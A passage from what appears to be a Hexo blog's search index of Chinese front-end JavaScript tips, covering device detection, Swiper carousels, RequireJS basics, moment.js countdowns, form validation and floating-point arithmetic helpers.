!!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), android: u.indexOf(&apos;Android&apos;) &gt; -1 || u.indexOf(&apos;Linux&apos;) &gt; -1, iPhone: u.indexOf(&apos;iPhone&apos;) &gt; -1 , iPad: u.indexOf(&apos;iPad&apos;) &gt; -1, webApp: u.indexOf(&apos;Safari&apos;) == -1 &#125; &#125;(), language:(navigator.browserLanguage || navigator.language).toLowerCase()&#125;;if(browser.versions.ios || browser.versions.iPhone || browser.versions.iPad)&#123; // 苹果设备&#125; else &#123; // 非苹果设备&#125; 判断是否是微信1var isOnWeixin = navigator.userAgent.indexOf("MicroMessenger") &gt; -1; // 识别客户端 在微信中判断当前设备123456789if(isOnWeixin)&#123; //微信端 if(browser.versions.ios || browser.versions.iPhone || browser.versions.iPad)&#123; //苹果设备 &#125; else &#123; //非苹果设备 &#125;&#125; else &#123; //非微信端&#125; 参考：http://ju.outofmemory.cn/entry/117648]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js动态插入link标签]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%8A%A8%E6%80%81%E6%8F%92%E5%85%A5css%E6%A0%B7%E5%BC%8F%E6%A0%87%E7%AD%BE.html</url>
    <content type="text"><![CDATA[12345678var includeCss = function(url) &#123; var link = document.createElement("link"); link.rel = "stylesheet"; link.type = "text/css"; link.href = url; document.getElementsByTagName("head")[0].appendChild(link)&#125;;includeCss("./css/Mdate.css");]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js实现手机号输入框中间空格效果]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%AE%9E%E7%8E%B0%E8%BE%93%E5%85%A5%E6%A1%86%E6%89%8B%E6%9C%BA%E5%8F%B7%E4%B8%AD%E9%97%B4%E7%A9%BA%E6%A0%BC%E6%95%88%E6%9E%9C.html</url>
    <content type="text"><![CDATA[效果如下： 具体实现如下：1&lt;input type="tel" class="phone" v-model="phoneText" @keydown="keyDown" @keyup.delete="keyUp" maxlength="13"&gt; 123456789keyDown (e) &#123; // 按下时判断在指定位置添加空格 if (e.keyCode !== 8 &amp;&amp; (this.phoneText.length === 3 || this.phoneText.length === 8)) &#123; this.phoneText += ' ' &#125;&#125;,keyUp () &#123; // 删除键抬起后清楚结尾空格 // 非vue写法 if (e.keyCode === 8) &#123;&#125; this.phoneText = this.phoneText.replace(/\s*$/g, '')&#125; 如果想要初始化赋值：123this.phoneText = this.phoneText .replace(this.phoneText.substr(2, 1), this.phoneText.substr(2, 1) + &apos; &apos;) .replace(this.phoneText.substr(6, 1), this.phoneText.substr(6, 1) + &apos; &apos;)]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js获取不定key的对象的key值和value值]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E8%8E%B7%E5%8F%96%E4%B8%8D%E5%AE%9Akey%E7%9A%84%E5%AF%B9%E8%B1%A1%E7%9A%84key%E5%80%BC%E5%92%8Cvalue%E5%80%BC.html</url>
    <content type="text"><![CDATA[对于已经固定key的对象，我们很容易可以去到它对应的value值，但有时候拿到的是不定key的对象，这个时候该怎么取 如：123456var array=[ &#123;&apos;50026460&apos;: &apos;童装&apos;&#125;, &#123;&apos;50022517&apos;: &apos;男装&apos;&#125;, &#123;&apos;50022620&apos;: &apos;女装&apos;&#125;, &#123;&apos;50022740&apos;: &apos;孕妇装&apos;&#125;]; 可以使用Object.keys方法来处理 获取key值：12345for(var i=0;i&lt;array.length;i++)&#123; var item=array[i]; var key=Object.keys(item); console.log(key);&#125; 获取value值：12345for(var i=0;i&lt;array.length;i++)&#123; var item=array[i]; var key=Object.keys(item); console.log(item[key]);&#125; 最后吐槽一下，这种数据结构有些不太合理，实际应用中应当减少使用这种数据结构。 理想的数据结构应该是这种：123456var array=[ &#123;id: &apos;50026460&apos;, name: &apos;童装&apos;&#125;, &#123;id: &apos;50022517&apos;, name: &apos;男装&apos;&#125;, &#123;id: &apos;50022620&apos;, name: &apos;女装&apos;&#125;, &#123;id: &apos;50022740&apos;, name: &apos;孕妇装&apos;&#125;];]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js遍历数据根据条件删除数组元素]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E9%81%8D%E5%8E%86%E6%95%B0%E7%BB%84%E6%A0%B9%E6%8D%AE%E6%9D%A1%E4%BB%B6%E5%88%A0%E9%99%A4%E6%95%B0%E7%BB%84%E5%85%83%E7%B4%A0.html</url>
    <content type="text"><![CDATA[有时，我们会有这样一个需求，当我们从后端取到一个list数组时，我们需要进行二次处理，处理成我们需要的数据，如： 1234567891011121314151617181920212223242526272829var arr = [ &#123; status:0 &#125;, &#123; status:1 &#125;, &#123; status:0 &#125;, &#123; status:0 &#125;, &#123; status:3 &#125;, &#123; status:0 &#125;, &#123; status:7 &#125;, &#123; status:0 &#125;, &#123; status:2 &#125;]; 遍历上面的数组，删除status=0的项，我们很容易想到，先for循环（或forEach、map等）遍历，然后使用array的splice方法删除指定索引未知的项。 但在操作之后，我们发现，当我们删除一个之后索引值会变化，这就造成只能删除第一个。我们发现，for循环遍历时，遍历一次，i加1，那我们可以这样当执行splice删除的时候，我们不让i+1，否则才递增。该如何实现呢？ 123456789for(var i=0, flag=true, len=arr.length; i&lt;len; flag ? i++ : i)&#123; if( arr[i] &amp;&amp; arr[i].status==0 )&#123; arr.splice(i, 1); flag = false; &#125; else &#123; flag = true; &#125;&#125;console.log(arr); 这种做法效率非常高，值得推荐。]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[moment操作时间]]></title>
    <url>%2Fblog%2Fjavascript%2Fmoment%E5%AE%9E%E7%8E%B0%E6%AF%94%E8%BE%83%E6%97%B6%E9%97%B4%E5%92%8C%E5%80%92%E8%AE%A1%E6%97%B6.html</url>
    <content type="text"><![CDATA[moment.js:http://momentjs.cn/ 转换时间js转换时间12345var date = new Date(value)const [years, month, day, hours, minutes, seconds] = [date.getFullYear(), date.getMonth() + 1, date.getDate(), date.getHours(), date.getMinutes(), date.getSeconds()]var format = `$&#123;years&#125;年$&#123;('0' + month).slice(-2)&#125;月$&#123;('0' + day).slice(-2)&#125;日 $&#123;('0' + hours).slice(-2)&#125;时$&#123;('0' + minutes).slice(-2)&#125;分$&#123;('0' + seconds).slice(-2)&#125;秒` moment转换时间1moment(new Date(value)).format('YYYYMMDDHHmmss'); 比较时间123456// 使用diff来比较时间const startedAt = moment(user.started_at) // 开始时间const expiredAt = moment(user.expired_at) // 过期时间const serverAt = moment(this.model.timer.server_time) // 服务器时间const started = serverAt.diff(startedAt) &gt; 0 // 服务器时间大于开始时间const expired = serverAt.diff(expiredAt) &gt; 0 // 服务器时间大于过期时间 倒计时js倒计时js倒计时方法1123456789101112131415161718192021function formatSeconds(value) &#123; var theTime = parseInt(value);// 秒 var theTime1 = 0;// 分 var theTime2 = 0;// 小时 if(theTime &gt; 60) &#123; theTime1 = parseInt(theTime/60); theTime = parseInt(theTime%60); if(theTime1 &gt; 60) &#123; theTime2 = parseInt(theTime1/60); theTime1 = parseInt(theTime1%60); &#125; &#125; var result = "" + parseInt(theTime) + "秒"; if(theTime1 &gt; 0) &#123; result = "" + parseInt(theTime1) + "分" + result; &#125; if(theTime2 &gt; 0) &#123; result = "" + parseInt(theTime2) + "小时" + result; &#125; return result;&#125; js倒计时方法2123456789101112131415161718192021const diffSeconds = 7280// 耗时控制if (diffSeconds &lt; 60) &#123; // 0 ~ 60s this.redpacket.seconds = moment('0秒', 's秒').add(diffSeconds, 's').format('s秒') console.log('1')&#125; else if ((diffSeconds &gt; 60) &amp;&amp; (diffSeconds &lt; 3600) &amp;&amp; (diffSeconds % 60 !== 0)) &#123; // 60s ~ 3600s 但 不整除分钟 this.redpacket.seconds = moment('0分0秒', 'm分s秒').add(diffSeconds, 's').format('m分s秒') console.log('2')&#125; else if ((diffSeconds &gt; 3600) &amp;&amp; (diffSeconds % 60 !== 0)) &#123; // &gt;3600s 但 不整除小时 this.redpacket.seconds = moment('0时0分0秒', 'H小时m分s秒').add(diffSeconds, 's').format('H小时m分s秒') console.log('3')&#125; else if ((diffSeconds &lt; 3600) &amp;&amp; (diffSeconds % 60 === 0) &amp;&amp; (diffSeconds % 3600 !== 0)) &#123; // 60s ~ 3600s,整除分钟 但 不整除小时 this.redpacket.seconds = moment('0分', 'm分').add(diffSeconds, 's').format('m分') console.log('4')&#125; else if ((diffSeconds &gt; 3600) &amp;&amp; (diffSeconds % 60 === 0) &amp;&amp; (diffSeconds % 3600 !== 0)) &#123; // &gt;3600s,整除分钟 但 不整除小时 this.redpacket.seconds = moment('0时0分', 'H小时m分').add(diffSeconds, 's').format('H小时m分') console.log('5')&#125; else if (diffSeconds % 3600 === 0) &#123; // 整除小时 this.redpacket.seconds = moment('0时', 'H小时').add(diffSeconds, 's').format('H小时') console.log('6')&#125; moment倒计时js:1234567891011121314151617181920212223this.countTime(360000) // 不超过3600 00（100h）// 将秒转换成时分秒（此处因实际需求将时分秒拆开显示）exchangeTime (seconds) &#123; const surplusDay = parseInt(seconds / 86400) // 天数取整 const countH = moment('00:00:00', 'HH:mm:ss').add(seconds, 's').format('HH') this.countHH = surplusDay === 0 ? countH : (surplusDay * 24 + parseInt(countH)) this.countmm = moment('00:00:00', 'HH:mm:ss').add(seconds, 's').format('mm') this.countss = moment('00:00:00', 'HH:mm:ss').add(seconds, 's').format('ss')&#125;,// 秒 倒计时countTime (seconds) &#123; const timmerHandler = setInterval(() =&gt; &#123; if (seconds &gt; 0) &#123; seconds-- this.exchangeTime(seconds) &#125; else &#123; seconds = 0 clearInterval(timmerHandler) &#125; &#125;, 1000)&#125;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[swiper轮播图实现]]></title>
    <url>%2Fblog%2Fjavascript%2Fswiper%E8%BD%AE%E6%92%AD%E5%9B%BE.html</url>
    <content type="text"><![CDATA[移动端wap页HTML:1234567891011div.swiper-container div.swiper-wrapper div.swiper-slide div.swiper-slide div.swiper-slide div.swiper-slide //- 分页器 div.swiper-pagination //- 按钮 div.swiper-button-next CSS123456789101112131415161718192021222324252627282930313233343536373839404142434445.swiper-container,.swiper-wrapper,.swiper-slide&#123; width: 100%; height: 100%;&#125;.swiper-pagination&#123; right: 10px; top: 50%; transform: translate(-50%, 0); display: none;&#125;.swiper-button-next&#123; width: r(60); height: r(60); border-radius: 50%; background: url('../img/scroll-btn.png') no-repeat; background-size: 100% 100%; left: 50%; top: 100%; margin-top: r(-90); transform: translate(-50%, 0);&#125;.swiper-button-ani&#123; animation: swiper-btn-ani 1s linear infinite;&#125;@keyframes swiper-btn-ani&#123; 0%, 100%&#123; transform: translate(-50%, 0); &#125; 50%&#123; transform: translate(-50%, r(10)); &#125;&#125;.slidebox1,.slidebox2,.slidebox3,.slidebox4&#123; width: 100%; height: 100%; background: url('../img/bg1.png') no-repeat center center; background-size: cover; overflow: hidden;&#125; JS：1234567891011121314151617181920212223// 轮播图var mySwiper = new Swiper ('.swiper-container', &#123; initialSlide: 0, // 初始页数 direction: 'vertical', // 控制水平或垂直 // autoplay: 3000, // 3s自动切换 apeed: 300, // 划过的速度 // loop: true, onlyExternal: false, /*不能拖动*/ autoplayDisableOnInteraction: false, // 用户操作后不禁用自动播放 // pagination: '.swiper-pagination', // 底部分页按钮 // paginationClickable: true, // 分页按钮可点击 // prevButton: '.swiper-button-prev'， // 左按钮 nextButton: '.swiper-button-next', // 右按钮 onInit: function (swiper) &#123; // swiper初始化 $('.swiper-button-next').addClass('swiper-button-ani'); &#125;, onReachEnd: function (swiper) &#123; // 到达最后一页的事件操作 $('.swiper-button-next').removeClass('swiper-button-ani').hide(); &#125;, onSlidePrevEnd: function (swiper) &#123; //从最后往左切换的事件操作 $('.swiper-button-next').addClass('swiper-button-ani').show(); &#125;&#125;); PC端banner轮播图HTML:123456789101112131415161718192021&lt;div class="swiper-container"&gt; &lt;div class="swiper-wrapper"&gt; &lt;div class="swiper-slide"&gt; &lt;a href="" target="blank" class="swiper-link"&gt;&lt;img src="" alt="" class="swiper-img"&gt;&lt;/a&gt; &lt;/div&gt; &lt;div class="swiper-slide"&gt; &lt;a href="" target="blank" class="swiper-link"&gt;&lt;img src="" alt="" class="swiper-img"&gt;&lt;/a&gt; &lt;/div&gt; &lt;div class="swiper-slide"&gt; &lt;a href="" target="blank" class="swiper-link"&gt;&lt;img src="" alt="" class="swiper-img"&gt;&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 底部分页器 --&gt; &lt;div class="swiper-pagination"&gt;&lt;/div&gt; &lt;div class="operate-box"&gt; &lt;!-- 左右按钮 --&gt; &lt;div class="swiper-button-prev"&gt;&lt;/div&gt; &lt;div class="swiper-button-next"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; django:12345678910111213141516171819202122232425&lt;div class="swiper-container"&gt; &lt;div class="swiper-wrapper"&gt; &#123;% for banner in banners %&#125; &lt;div class="swiper-slide"&gt; &#123;% if banner.url %&#125; &lt;a href="&#123;&#123; banner.url &#125;&#125;" target="blank" class="swiper-link"&gt; &lt;img src="&#123;&#123; banner.banner_img_url &#125;&#125;" alt="" class="swiper-img"&gt; &lt;/a&gt; &#123;% else %&#125; &lt;a href="javascript:void(0)" class="swiper-link"&gt; &lt;img src="&#123;&#123; banner.banner_img_url &#125;&#125;" alt="" class="swiper-img"&gt; &lt;/a&gt; &#123;% endif %&#125; &lt;/div&gt; &#123;% endfor %&#125; &lt;/div&gt; &lt;!-- 底部分页器 --&gt; &lt;div class="swiper-pagination"&gt;&lt;/div&gt; &lt;div class="operate-box"&gt; &lt;!-- 左右按钮 --&gt; &lt;div class="swiper-button-prev"&gt;&lt;/div&gt; &lt;div class="swiper-button-next"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt; CSS:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990.swiper-container&#123; /*width: auto;*/ /*宽度由js给出*/ width: 100%; height: 700px; /*position: absolute; left: 50%; top: 0; -webkit-transform: translate(-50%, 0); transform: translate(-50%, 0);*/&#125;.swiper-wrapper&#123; width: 100%; height: 700px;&#125;.swiper-slide&#123; width: 100%; height: 700px;&#125;/*link 和 img由开发者另行创建*/.swiper-link&#123; display: inline-block; width: 100%; height: 700px; position: relative;&#125;.swiper-img&#123; height: 700px;&#125;.swiper-slide-active .swiper-img&#123; max-width: none; height: 700px; position: absolute; left: 50%; top: 0; -webkit-transform: translate(-50%, 0); transform: translate(-50%, 0);&#125;/* 1、对于banner图使用常用长图页*//* 由于宽度的不确定性，故增加左右按钮的父级div，方便定位 *//* 但当父级div高度太大时会影响图片的点击效果 *//* 故将父级div设置再banner图外，再配合margin-top手动将左右按钮设置到所需位置 *//* 2、对于banner使用中间图片加左右填充色 *//* 正常定位即可 */.operate-box&#123; width: 960px; height: 40px; position: absolute; left: 50%; top: -40px; -webkit-transform: translate(-50%, 0); transform: translate(-50%, 0); z-index: 50;&#125;.swiper-pagination&#123; z-index: 500;&#125;.swiper-container-horizontal &gt; .swiper-pagination-bullets&#123; bottom: 20px;&#125;.swiper-pagination .swiper-pagination-bullet&#123; width: 8px; height: 8px; border-radius: 50%; opacity: 1; background: #ffffff;&#125;.swiper-pagination .swiper-pagination-bullet-active&#123; width: 20px; height: 8px; background: #ffffff; border-radius: 4px;&#125;.swiper-button-prev&#123; width: 40px; height: 40px; left: 0; background: url('../img/left-btn.png'); z-index: 500; margin-top: 370px;&#125;.swiper-button-next&#123; width: 40px; height: 40px; right: 0; background: url('../img/right-btn.png'); z-index: 500; margin-top: 370px;&#125; JS:12345678910111213141516171819&lt;script src="http://cdn.bootcss.com/Swiper/3.3.1/js/swiper.min.js"&gt;&lt;/script&gt;&lt;script&gt;$(function()&#123; // 轮播图 var mySwiper = new Swiper ('.swiper-container', &#123; // width: window.innerWidth, direction: 'horizontal', // 控制水平或垂直 autoplay: 3000, // 3s自动切换 apeed: 300, // 划过的速度 loop: true, onlyExternal: false, /*不能拖动*/ autoplayDisableOnInteraction: false, // 用户操作后不禁用自动播放 pagination: '.swiper-pagination', // 底部分页按钮 paginationClickable: true, // 分页按钮可点击 nextButton: '.swiper-button-next', // 左按钮 prevButton: '.swiper-button-prev' // 右按钮 &#125;);&#125;);&lt;/script&gt;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初识requirejs]]></title>
    <url>%2Fblog%2Fjavascript%2F%E5%88%9D%E8%AF%86%E6%A8%A1%E5%9D%97%E5%8C%96%E5%8A%A0%E8%BD%BDrequirejs.html</url>
    <content type="text"><![CDATA[在浏览器中可以作为js文件的模块加载器，也可以用在Node和Rhino环境。 初识requirejs先看一个小demo： index.html:123456789&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;script type="text/javascript" src="a.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;span&gt;body&lt;/span&gt; &lt;/body&gt;&lt;/html&gt; a.js:1234567891011121314function fun1()&#123; alert("it works");&#125;fun1();// 或 使用块作用域来申明function防止污染全局变量(function()&#123; function fun1()&#123; alert("it works"); &#125; fun1();&#125;)() 运行结果：alert执行的时候，页面上的span元素还未显示。这是因为js阻塞浏览器渲染，导致body内容未能被读取。 requirejs写法:先去require官网下载jsindex.html:123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;script type="text/javascript" src="require.js"&gt;&lt;/script&gt; &lt;script&gt; require(["a"]); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;span&gt;body&lt;/span&gt; &lt;/body&gt;&lt;/html&gt; a.js:1234567define(function () &#123; function func1 () &#123; alert('it works'); &#125; func1();&#125;) 运行结果：alert执行的时候，页面能正常显示body了 这个时候可以知道require的优点：1.防止js加载阻塞页面渲染2.管理模块之间的依赖性，便于代码的编写和维护，防止出现如下丑陋的场景。这种写法需要将依赖最大的放在最后加载，如j.js依赖前面的js，就必须放到最后，当关系很复杂时，极难维护。12345678910&lt;script type="text/javascript" src="a.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="b.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="c.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="d.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="e.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="f.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="g.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="h.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="i.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="j.js"&gt;&lt;/script&gt; 基本APIrequire会定义三个变量：define、require、requirejs，require = requirejs，一般使用require更简短 define 用来定义一个模块define后面也可以增加参数[“jqueyr”],即保证jquery加载完成后读取该js文件 123define([&quot;jquery&quot;], function ($) &#123; console.log(&apos;it is loaded&apos;)&#125;) require 加载依赖模块，并执行加载后的回调函数 require([“js/a.js”, “js/b.js”])的第一个参数时一个数组，即加载的脚本，第二个参数时callback，处理加载完毕后的回调123require(["js/a.js", "js/b.js"], function () &#123; console.log('load finished');&#125;) 加载文件使用require()来加载模块的使用只能加载本地js，但如果需要加载服务器、其他网站或CDN，就需要用require.config来配置加载123456789101112require.config(&#123; paths: &#123; "jquery": ["https://cdn.bootcss.com/jquery/2.2.4/jquery"], // 或省略中括号 "bootstrap": ["https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap"] &#125;&#125;);require(["jquery", "js/a.js"], function ($) &#123; $(function () &#123; console.log('load finished'); &#125;)&#125;); require.config 用来配置加载位置，给模块起一个更短更好记的名字，配置别名之后就可以再require中使用别名了。注意：require中的可以带.js后缀；paths中的路径不能带.js后缀，否则会报错，paths中的每个别名对应的js如果只有一个时可以省略中括号； require.config 中也可以用来配置本地的js 12345678910111213require.config(&#123; paths: &#123; "jquery": ["https://cdn.bootcss.com/jquery/2.2.4/jquery"], "bootstrap": ["https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap"], "a": "js/a" &#125;&#125;);require(["jquery", "a"], function ($) &#123; $(function () &#123; console.log('load finished'); &#125;)&#125;); 最终渲染成下面这样：12&lt;script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="jquery" src="http://cdn.bootcss.com/jquery/2.2.4/jquery.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="a" src="./a.js"&gt;&lt;/script&gt; 通过require.config配置模块名称时可以配置多个路径，比如配置一个CDN路径，再配一个本地的库1234567891011require.config(&#123; paths: &#123; "jquery": ["https://cdn.bootcss.com/jquery/2.2.4/jquery", 'js/jquery'], "a": "js/a" &#125;&#125;);require(["jquery", "a"], function ($) &#123; $(function () &#123; console.log('load finished'); &#125;)&#125;); 当paths中都是本地路径时，可以指定一个baseUrl表示目录123456789101112require.config(&#123; baseUrl: "js/lib", paths: &#123; "jquery": jquery', "a": "a" &#125;&#125;);require(["jquery", "a"], function ($) &#123; $(function () &#123; console.log('load finished'); &#125;)&#125;); 上例中require的callback中的参数$是jquery模块的输出变量，如果依赖多个模块，可以依次写入多个参数。将需要输出的模块写在前面，位置不能错乱。12345require(["jquery", "underscore", "js/a"], function($, _) &#123; $(function () &#123; _.each([1,2,3], alert); &#125;);&#125;) 全局配置require.config配置如果在每个页面中都加入，显然会十分不雅，requirejs提供了一种叫”主数据“的功能，我们首先创建一个main.js：1234567require.config(&#123; paths: &#123; "jquery": ["https://cdn.bootcss.com/jquery/2.2.4/jquery", 'js/jquery'], "a": "js/a" &#125;&#125;); 然后在页面中使用下面的方式来使用requirejs：1&lt;script data-main="js/main src="js/require.js"&gt;&lt;/script&gt; data-main属性表示指定的js将在加载完require.js后处理，我们把require.config的配置加入到data-main后，就可以使每一个页面都使用这个配置，然后页面中就可以直接使用require来加载所有的短模块名data-main还有一个功能，当script标签指定data-main属性时，require会默认将data-main指定的js为根路径。如上面的data-main=”js/main”设定后，我们在直接使用require([“jquery”])，而不是require([“js/jquery”])，require会自动加载js/jquery这个文件，而不是jquery.js。相当于默认配置了：123require.config(&#123; baseUrl: 'js'&#125;); 第三方模块通过require加载的模块一般都要符合AMD规范及使用define来申明模块，但是部分时候需要加载非AMD规范的js，这时候就需要用到另一个功能：shim，中文意思”垫“. 1、非AMD模块输出，例如，在老版本的jquery中，是没有继承AMD规范的，所以不能只能require([“jquery”])，这个时候就需要用到 shim，比如要使用underscore类库，但是它并没有实现AMD规范，可以这样配置1234567requier.config(&#123; shim: &#123; "underscore": &#123; export: "_" &#125; &#125;&#125;) 这样配置后，我们就可以再其他模块中引用underscore模块：123require(["underscore"], function (_) &#123; _.each([1, 2, 3], alert)&#125;) 2、插件形式的非AMD模块，我们经常会用到jquery的插件，而这些插件基本都不符合AMD规范比如，jquery的form插件，这时候就需要将form插件”垫“到jquery中12345678910require.config(&#123; shim: &#123; "underscore" : &#123; exports : "_"; &#125;, "jquery.form" : &#123; deps : ["jquery"] &#125; &#125;&#125;); 也可以简写成：12345678require.config(&#123; shim: &#123; "underscore" : &#123; exports : "_"; &#125;, "jquery.form" : ["jquery"] &#125;&#125;); exports表明该模块外部调用时的名称，deps数组表示该模块的依赖 这样配置之后我们就可以使用加载插件后的jquery了12345require.config(["jquery", "jquery.form"], function($)&#123; $(function()&#123; $("#form").ajaxSubmit(&#123;...&#125;); &#125;)&#125;); 来源：runoob文档]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[检测用户输入的信息是否为空]]></title>
    <url>%2Fblog%2Fjavascript%2F%E6%A3%80%E6%B5%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%98%AF%E5%90%A6%E4%B8%BA%E7%A9%BA.html</url>
    <content type="text"><![CDATA[点击触发12345$('.info-submit').on('click', function()&#123; //点击触发开始检测 if(checkEmptyInput())&#123; //信息全部正确，继续执行 &#125;&#125;); 逐个报错123456789101112131415161718function checkEmptyInput() &#123; //检测上传信息 var name = $(&apos;.name&apos;).val(); var phone = $(&apos;.phone&apos;).val(); var address = $(&apos;.address&apos;).val(); if ($.trim(name).length === 0) &#123; console.log(&apos;请输入姓名&apos;); return false; &#125; if ($.trim(phone).length === 0) &#123; console.log(&apos;请输入手机号&apos;); return false; &#125; if ($.trim(address).length === 0) &#123; console.log(&apos;请输入地址&apos;); return false; &#125; return true;&#125; 一起报错(表单常用报错方式)123456789101112131415161718192021222324252627function checkEmptyInput() &#123; //检测输入信息 var hasError = false; var nameValue= $(&apos;.name&apos;).val(); var ageValue = $(&apos;.age&apos;). val(); var phoneValue = $(&apos;.phone&apos;). val(); if (nameValue.length === 0) &#123; $(&apos;.p2-name-error&apos;).css(&#123;&apos;opacity&apos;: &apos;1&apos;&#125;); hasError = true; &#125; if (ageValue.length === 0) &#123; $(&apos;.p2-age-error&apos;).css(&#123;&apos;opacity&apos;: &apos;1&apos;&#125;); hasError = true; &#125; if (phoneValue.length === 0) &#123; $(&apos;.p2-tel-error&apos;).css(&#123;&apos;opacity&apos;: &apos;1&apos;&#125;); hasError = true; &#125; if((nameValue.length !== 0) &amp;&amp; (ageValue.length !== 0) &amp;&amp; (phoneValue.length !== 0))&#123; //所有信息正确 hasError = false; &#125; if(hasError) &#123; return false; &#125; else &#123; return true; &#125;&#125;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浮点数运算导致精度丢失]]></title>
    <url>%2Fblog%2Fjavascript%2F%E6%B5%AE%E7%82%B9%E6%95%B0%E8%BF%90%E7%AE%97%E5%AF%BC%E8%87%B4%E7%B2%BE%E5%BA%A6%E4%B8%A2%E5%A4%B1.html</url>
    <content type="text"><![CDATA[资料地址：https://segmentfault.com/a/1190000000324193 解决一：使用math.js库解决二：使用函数加法运算（0.1 + 0.2）1234567891011121314151617181920212223242526272829303132function accAdd(arg1, arg2) &#123; var r1, r2, m, c; try &#123; r1 = arg1.toString().split(".")[1].length; &#125; catch (e) &#123; r1 = 0; &#125; try &#123; r2 = arg2.toString().split(".")[1].length; &#125; catch (e) &#123; r2 = 0; &#125; c = Math.abs(r1 - r2); m = Math.pow(10, Math.max(r1, r2)); if (c &gt; 0) &#123; var cm = Math.pow(10, c); if (r1 &gt; r2) &#123; arg1 = Number(arg1.toString().replace(".", "")); arg2 = Number(arg2.toString().replace(".", "")) * cm; &#125; else &#123; arg1 = Number(arg1.toString().replace(".", "")) * cm; arg2 = Number(arg2.toString().replace(".", "")); &#125; &#125; else &#123; arg1 = Number(arg1.toString().replace(".", "")); arg2 = Number(arg2.toString().replace(".", "")); &#125; return (arg1 + arg2) / m;&#125;//给Number类型增加一个add方法，调用起来更加方便。Number.prototype.add = function (arg) &#123; return accAdd(arg, this);&#125;; 减法运算（0.3 - 0.1）123456789101112131415161718function accSub(arg1, arg2) &#123; var r1, r2, m, n; try &#123; r1 = arg1.toString().split(".")[1].length; &#125; catch (e) &#123; r1 = 0; &#125; try &#123; r2 = arg2.toString().split(".")[1].length; &#125; catch (e) &#123; r2 = 0; &#125; m = Math.pow(10, Math.max(r1, r2)); //last modify by deeka //动态控制精度长度 n = (r1 &gt;= r2) ? r1 : r2; return ((arg1 * m - arg2 * m) / m).toFixed(n);&#125;// 给Number类型增加一个mul方法，调用起来更加方便。Number.prototype.sub = function (arg) &#123; return accMul(arg, this);&#125;; 乘法运算（1.1 * 100）12345678910111213141516function accMul(arg1, arg2) &#123; var m = 0, s1 = arg1.toString(), s2 = arg2.toString(); try &#123; m += s1.split(".")[1].length; &#125; catch (e) &#123; &#125; try &#123; m += s2.split(".")[1].length; &#125; catch (e) &#123; &#125; return Number(s1.replace(".", "")) * Number(s2.replace(".", "")) / Math.pow(10, m);&#125;// 给Number类型增加一个mul方法，调用起来更加方便。Number.prototype.mul = function (arg) &#123; return accMul(arg, this);&#125;; 除法运算（111 / 1.11）123456789101112131415161718function accDiv(arg1, arg2) &#123; var t1 = 0, t2 = 0, r1, r2; try &#123; t1 = arg1.toString().split(".")[1].length; &#125; catch (e) &#123; &#125; try &#123; t2 = arg2.toString().split(".")[1].length; &#125; catch (e) &#123; &#125; r1 = Number(arg1.toString().replace(".", "")); r2 = Number(arg2.toString().replace(".", "")); return (r1 / r2) * Math.pow(10, t2 - t1);&#125;//给Number类型增加一个div方法，调用起来更加方便。Number.prototype.div = function (arg) &#123; return accDiv(this, arg);&#125;;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端fixed浮层下面的页面仍能滚动]]></title>
    <url>%2Fblog%2Fjavascript%2F%E7%A7%BB%E5%8A%A8%E7%AB%AFfixed%E6%B5%AE%E5%B1%82%E4%B8%8B%E9%9D%A2%E7%9A%84%E9%A1%B5%E9%9D%A2%E4%BB%8D%E8%83%BD%E6%BB%9A%E5%8A%A8.html</url>
    <content type="text"><![CDATA[在弹窗弹出的时候：12345document.body.style.overflow = 'hidden';// 或：$('body').css('overflow', 'hidden'); 在弹窗隐藏的时候：12345document.body.style.overflow = 'initial';// 或：$('body').css('overflow', 'initial'); // 或改为auto 对于多个fixed弹窗，可以写个遍历函数，遍历当某个fixed元素显示的时候将body的滚动禁止 参考资料：https://segmentfault.com/q/1010000002942948]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
